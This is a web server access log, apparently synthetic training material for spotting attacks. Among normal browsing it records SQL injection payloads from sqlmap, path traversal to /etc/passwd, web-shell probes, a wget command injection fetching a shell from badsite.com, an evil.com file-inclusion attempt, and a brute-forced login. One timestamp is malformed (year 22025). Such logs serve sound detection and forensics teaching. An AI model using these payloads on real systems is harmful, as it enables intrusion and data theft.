88.201.55.12 - - [27/Oct/2025:10:30:00 +0100] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.5 - - [27/Oct/2025:10:30:01 +0100] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
192.168.1.6 - - [27/Oct/2025:10:31:00 +0100] "GET /about.html HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
88.201.55.12 - - [27/Oct/2025:10:31:02 +0100] "GET /css/style.css HTTP/1.1" 200 3012 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.5 - - [27/Oct/2025:10:31:03 +0100] "GET /images/logo.png HTTP/1.1" 200 890 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
10.0.0.88 - - [27/Oct/2025:10:32:05 +0100] "GET /products.php?id=1' OR 1=1--" 200 4012 "-" "python-requests/2.28.1"
203.0.113.42 - - [27/Oct/2025:10:32:15 +0100] "GET /products/item1 HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/605.1.15"
192.168.1.5 - - [27/Oct/2025:10:33:00 +0100] "POST /login.php HTTP/1.1" 200 1500 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
212.22.13.5 - - [27/Oct/2025:10:34:00 +0100] "GET /admin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
212.22.13.5 - - [27/Oct/2025:10:34:01 +0100] "GET /administrator/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
212.22.13.5 - - [27/Oct/2025:10:34:02 +0100] "GET /phpmyadmin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
212.22.13.5 - - [27/Oct/2025:10:34:03 +0100] "GET /wp-admin/ HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
192.168.1.7 - - [27/Oct/2025:10:34:30 +0100] "GET /contact.html HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.7 - - [27/Oct/2025:10:34:45 +0100] "POST /submit_form.php HTTP/1.1" 301 20 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
212.22.13.5 - - [27/Oct/2025:10:35:10 +0100] "GET /page.php?file=../../../../etc/passwd" 404 568 "-" "python-requests/2.28.1"
192.168.1.5 - - [27/Oct/2025:10:35:11 +0100] "GET /logout.php HTTP/1.1" 301 20 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
10.0.0.88 - - [27/Oct/2025:10:36:15 +0100] "GET /products.php?id=1 UNION SELECT 1,2,user,pass FROM users--" 200 4012 "-" "sqlmap/1.6.3"
172.16.0.10 - - [27/Oct/2025:10:37:00 +0100] "GET /uploads/c99.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
88.201.55.12 - - [27/Oct/2025:10:37:05 +0100] "GET /products/item2 HTTP/1.1" 200 2346 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.7 - - [27/Oct/2025:10:38:00 +0100] "GET /contact-thanks.html HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
203.0.113.42 - - [27/Oct/2025:10:38:05 +0100] "POST /cart.php?action=add HTTP/1.1" 200 120 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/605.1.15"
212.22.13.5 - - [27/Oct/2025:10:38:10 +0100] "GET /scripts/setup.sh HTTP/1.1" 404 567 "-" "Nmap Scripting Engine"
10.0.0.88 - - [27/Oct/2025:10:38:15 +0100] "GET /products.php?id=1 AND 1=1" 200 4012 "-" "sqlmap/1.6.3"
172.16.0.10 - - [27/Oct/2025:10:38:30 +0100] "GET /shell.php?cmd=ls" 404 567 "-" "python-requests/2.28.1"
192.168.1.6 - - [27/Oct/2025:10:38:33 +0100] "GET /blog/post1 HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.6 - - [27/Oct/2025:10:38:35 +0100] "GET /images/blog-header.jpg HTTP/1.1" 200 12390 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
10.0.0.88 - - [27/Oct/2025:10:39:00 +0100] "GET /products.php?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(1,1))),0x7e) AS x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) AS y) AND '1'='1" 200 4012 "-" "sqlmap/1.6.3"
203.0.113.42 - - [27/Oct/2025:10:39:01 +0100] "GET /checkout.php HTTP/1.1" 200 3450 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/605.1.15"
192.168.1.5 - - [27/Oct/2025:10:39:05 +0100] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
212.22.13.5 - - [27/Oct/2025:10:40:02 +0100] "GET /index.php?cmd=cd /tmp/;wget http://badsite.com/shell.txt" 200 167 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:41:00 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:41:01 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:41:02 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:41:03 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:41:04 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:41:05 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
88.201.55.12 - - [27/Oct/2025:10:41:10 +0100] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.6 - - [27/Oct/2025:10:41:15 +0100] "GET /blog/post2 HTTP/1.1" 200 5690 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
172.16.0.10 - - [27/Oct/2025:10:42:00 +0100] "GET /uploads/shell.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
192.168.1.5 - - [27/Oct/2025:10:42:01 +0100] "GET /products/item3 HTTP/1.1" 200 2347 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
10.0.0.88 - - [27/Oct/2025:10:42:05 +0100] "GET /products.php?id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))" 200 4012 "-" "sqlmap/1.6.3"
192.168.1.6 - - [27/Oct/2025:10:42:10 +0100] "GET /blog/post1 HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
203.0.113.42 - - [27/Oct/2025:10:42:15 +0100] "POST /checkout.php HTTP/1.1" 200 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/605.1.15"
172.16.0.10 - - [27/Oct/2025:10:42:30 +0100] "GET /admin.php HTTP/1.1" 404 567 "-" "python-requests/2.28.1"
212.22.13.5 - - [27/Oct/2025:10:42:33 +0100] "GET /page.php?file=..%2F..%2F..%2Fetc%2Fhosts" 404 568 "-" "python-requests/2.28.1"
88.201.55.12 - - [27/Oct/2025:10:42:35 +0100] "GET /products/item4 HTTP/1.1" 200 2348 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
192.168.1.5 - - [27/Oct/2025:10:42:40 +0100] "POST /cart.php?action=add HTTP/1.1" 200 120 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
10.0.0.88 - - [27/Oct/2025:10:43:00 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:43:01 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:43:02 +0100] "POST /login.php HTTP/1.1" 401 1500 "-" "python-requests/2.28.1"
10.0.0.88 - - [27/Oct/2025:10:43:03 +0100] "POST /login.php HTTP/1.1" 200 1450 "-" "python-requests/2.28.1"
192.168.1.7 - - [27/Oct/2025:10:43:05 +0100] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
212.22.13.5 - - [27/Oct/2025:10:43:10 +0100] "GET /?file=http://evil.com/malicious.txt" 200 167 "-" "python-requests/2.28.1"
88.201.55.12 - - [27/Oct/2025:10:43:12 +0100] "GET /products/item1 HTTP/1.1" 200 2345 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
172.16.0.10 - - [27/Oct/2025:10:43:15 +0100] "GET /bypass.php?cmd=whoami" 404 567 "-" "python-requests/2.28.1"
192.168.1.6 - - [27/Oct/2025:10:43:20 +0100] "GET /blog/tags/cybersecurity HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
203.0.113.42 - - [27/Oct/22025:10:43:22 +0100] "GET /images/item1.jpg HTTP/1.1" 200 25480 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/605.1.15"
10.0.0.88 - - [27/Oct/2025:10:43:30 +0100] "GET /admin/dashboard.php HTTP/1.1" 200 3045 "-" "python-requests/2.28.1"
212.22.13.5 - - [27/Oct/2025:10:43:35 +0100] "GET /server-status HTTP/1.1" 404 567 "-" "python-requests/2.28.1"